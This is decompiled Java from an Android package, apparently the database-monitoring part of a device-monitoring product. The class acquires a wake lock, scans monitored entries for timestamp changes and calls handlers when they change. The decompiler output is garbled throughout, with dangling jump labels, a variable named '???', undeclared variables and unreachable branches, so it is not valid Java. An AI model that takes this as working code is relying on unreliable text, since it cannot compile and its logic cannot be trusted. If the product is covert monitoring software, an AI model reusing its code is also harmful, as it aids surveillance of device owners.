package com.vvt.n.a;

import android.content.Context;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import java.util.Date;
import java.util.Enumeration;
import java.util.Hashtable;

class d
  implements Runnable
{
  d(c paramc) {}
  
  public void run()
  {
    int i = 1;
    boolean bool1 = c.c();
    if (bool1) {}
    Object localObject1 = c.b(this.a);
    Object localObject6 = "power";
    localObject1 = (PowerManager)((Context)localObject1).getSystemService((String)localObject6);
    label235:
    label384:
    label585:
    label591:
    label592:
    label808:
    label821:
    try
    {
      localObject6 = this.a;
      localObject6 = c.c((c)localObject6);
      if (localObject6 == null) {
        break label592;
      }
      localObject6 = this.a;
      localObject6 = c.c((c)localObject6);
      bool2 = ((PowerManager.WakeLock)localObject6).isHeld();
      if (bool2) {
        break label592;
      }
      bool1 = c.c();
      if (bool1) {}
      localObject1 = this.a;
      localObject1 = c.c((c)localObject1);
      ((PowerManager.WakeLock)localObject1).acquire();
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2;
        bool1 = c.f();
        if (bool1) {}
        return;
        localObject6 = this.a;
        localObject6 = c.c((c)localObject6);
        if (localObject6 != null)
        {
          bool3 = c.c();
          if (bool3) {}
          localObject6 = this.a;
          localObject6 = c.c((c)localObject6);
          bool3 = ((PowerManager.WakeLock)localObject6).isHeld();
          if (bool3)
          {
            localObject6 = this.a;
            localObject6 = c.c((c)localObject6);
            ((PowerManager.WakeLock)localObject6).release();
            bool3 = c.c();
            if (!bool3) {}
          }
          localObject6 = this.a;
          m = 0;
          localObject8 = null;
          c.a((c)localObject6, null);
        }
        bool3 = c.c();
        if (bool3) {}
        localObject6 = this.a;
        m = 1;
        ??? = "DatabaseMonitorManagerWakeLock";
        localObject3 = ((PowerManager)localObject3).newWakeLock(m, (String)???);
        c.a((c)localObject6, (PowerManager.WakeLock)localObject3);
        localObject3 = this.a;
        localObject3 = c.c((c)localObject3);
        ((PowerManager.WakeLock)localObject3).acquire();
      }
    }
    finally
    {
      localObject6 = c.c(this.a);
      if (localObject6 == null) {
        break label821;
      }
      localObject6 = c.c(this.a);
      bool3 = ((PowerManager.WakeLock)localObject6).isHeld();
      if (!bool3) {
        break label808;
      }
      localObject6 = c.c(this.a);
      ((PowerManager.WakeLock)localObject6).release();
      bool3 = c.c();
      if (!bool3) {
        break label808;
      }
      localObject6 = this.a;
      c.a((c)localObject6, null);
    }
    localObject1 = this.a;
    for (;;)
    {
      int m;
      Object localObject8;
      Object localObject10;
      boolean bool3;
      synchronized (c.d((c)localObject1))
      {
        localObject1 = this.a;
        localObject1 = c.d((c)localObject1);
        Enumeration localEnumeration = ((Hashtable)localObject1).keys();
        if (localEnumeration == null) {
          break label1190;
        }
        m = 0;
        localObject8 = null;
        bool1 = localEnumeration.hasMoreElements();
        if (!bool1) {
          break label1190;
        }
        localObject1 = localEnumeration.nextElement();
        Object localObject9 = localObject1;
        localObject9 = (String)localObject1;
        localObject6 = localObject9;
        bool1 = c.c();
        if (bool1) {}
        localObject1 = this.a;
        localObject1 = c.d((c)localObject1);
        localObject1 = ((Hashtable)localObject1).get(localObject6);
        localObject1 = (f)localObject1;
        bool6 = localObject1 instanceof h;
        if (bool6)
        {
          localObject8 = this.a;
          m = c.a((c)localObject8, (String)localObject6);
          localObject8 = localObject6;
          bool2 = m;
          if (!bool2) {
            break label1163;
          }
          bool2 = c.c();
          if (bool2) {}
          localObject6 = this.a;
          localObject10 = c.b((c)localObject6, (String)localObject8);
          if (localObject10 == null) {
            continue;
          }
          bool2 = c.c();
          if (bool2) {}
          localObject6 = this.a;
          localObject6 = c.h((c)localObject6);
          bool2 = ((Date)localObject10).after((Date)localObject6);
          if (!bool2) {
            break label1073;
          }
          bool2 = c.d();
          if (bool2) {}
          int j = ((f)localObject1).b();
          boolean bool7 = c.c();
          if (bool7) {}
          j += 1;
          bool7 = c.c();
          if (bool7) {}
          ((f)localObject1).a(j);
          int n = 5;
          if (j < n) {
            break label1258;
          }
          bool3 = c.e();
          if (bool3) {}
          bool3 = i;
          if (!bool3) {
            continue;
          }
          localObject6 = ((f)localObject1).a();
          if (localObject6 == null)
          {
            bool3 = c.e();
            if (bool3) {}
            localObject9 = localObject1;
            localObject9 = (com.vvt.n.a.a.a)localObject1;
            localObject6 = localObject9;
            localObject6 = ((com.vvt.n.a.a.a)localObject9).c();
            if (localObject6 != null) {
              ((a)localObject6).c((String)localObject8);
            }
          }
          bool3 = false;
          localObject6 = null;
          ((f)localObject1).a(0);
          ((f)localObject1).a((Date)localObject10);
          bool3 = localObject1 instanceof com.vvt.n.a.a.a;
          if (!bool3) {
            break label1152;
          }
          localObject1 = (com.vvt.n.a.a.a)localObject1;
          localObject1 = ((com.vvt.n.a.a.a)localObject1).c();
          if (localObject1 == null) {
            continue;
          }
          bool3 = c.e();
          if (bool3) {}
          ((a)localObject1).a((String)localObject8);
        }
      }
      Object localObject3;
      boolean bool6 = localObject4 instanceof com.vvt.n.a.e.a;
      Object localObject11;
      boolean bool5;
      Object localObject5;
      if (bool6)
      {
        localObject8 = this.a;
        localObject8 = c.e((c)localObject8);
        localObject10 = this.a;
        localObject10 = c.f((c)localObject10);
        localObject11 = this.a;
        localObject11 = c.g((c)localObject11);
        localObject6 = com.vvt.n.a.e.b.a((String)localObject6, (String)localObject8, (String)localObject10, (String)localObject11);
        bool5 = com.vvt.ag.b.a((String)localObject6);
        if (!bool5)
        {
          localObject8 = localObject6;
          bool3 = i;
        }
      }
      else
      {
        bool6 = localObject4 instanceof com.vvt.n.a.a.b;
        if (bool6)
        {
          localObject10 = this.a;
          bool6 = c.a((c)localObject10, (String)localObject6);
          if (!bool6) {
            break label1287;
          }
          localObject5 = (com.vvt.n.a.a.b)localObject4;
          localObject5 = ((com.vvt.n.a.a.b)localObject5).c();
          if (localObject5 == null) {
            continue;
          }
          ((g)localObject5).b((String)localObject6);
          continue;
        }
        bool3 = localObject5 instanceof com.vvt.n.a.b.a;
        if (!bool3) {
          break label1287;
        }
        localObject6 = com.vvt.n.a.b.b.b();
        bool6 = com.vvt.ag.b.a((String)localObject6);
        if (bool6) {
          break label1280;
        }
        localObject8 = this.a;
        localObject8 = c.e((c)localObject8);
        localObject10 = this.a;
        localObject10 = c.f((c)localObject10);
        localObject11 = this.a;
        localObject11 = c.g((c)localObject11);
        localObject6 = com.vvt.n.a.b.b.a((String)localObject8, (String)localObject6, (String)localObject10, (String)localObject11);
      }
      label1073:
      label1152:
      label1163:
      label1190:
      label1258:
      label1280:
      for (localObject6 = com.vvt.n.a.b.b.a((String)localObject6);; localObject6 = localObject8)
      {
        bool5 = com.vvt.ag.b.a((String)localObject6);
        if (!bool5)
        {
          localObject8 = localObject6;
          bool3 = i;
          break label235;
          localObject6 = ((f)localObject5).a();
          if (localObject6 != null)
          {
            boolean bool8 = c.c();
            if (bool8) {}
            int k = ((Date)localObject6).compareTo((Date)localObject10);
            if (k != 0)
            {
              k = i;
              break label384;
            }
            bool4 = c.c();
            if (!bool4) {
              break label1258;
            }
            bool4 = false;
            localObject6 = null;
            break label384;
          }
          bool4 = c.d();
          if (bool4) {}
          bool4 = i;
          break label384;
          bool1 = c.f();
          if (!bool1) {
            break;
          }
          break;
          bool4 = c.d();
          if (bool4) {}
          bool4 = false;
          localObject6 = null;
          ((f)localObject5).a(null);
          break;
          bool1 = c.c();
          if (bool1) {}
          localObject5 = c.c(this.a);
          if (localObject5 == null) {
            break label591;
          }
          localObject5 = c.c(this.a);
          bool1 = ((PowerManager.WakeLock)localObject5).isHeld();
          if (bool1)
          {
            localObject5 = c.c(this.a);
            ((PowerManager.WakeLock)localObject5).release();
            bool1 = c.c();
            if (!bool1) {}
          }
          localObject5 = this.a;
          break label585;
          bool4 = false;
          localObject6 = null;
          break label384;
        }
        localObject8 = localObject6;
        bool4 = false;
        localObject6 = null;
        break label235;
      }
      label1287:
      boolean bool4 = false;
      localObject6 = null;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/n/a/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */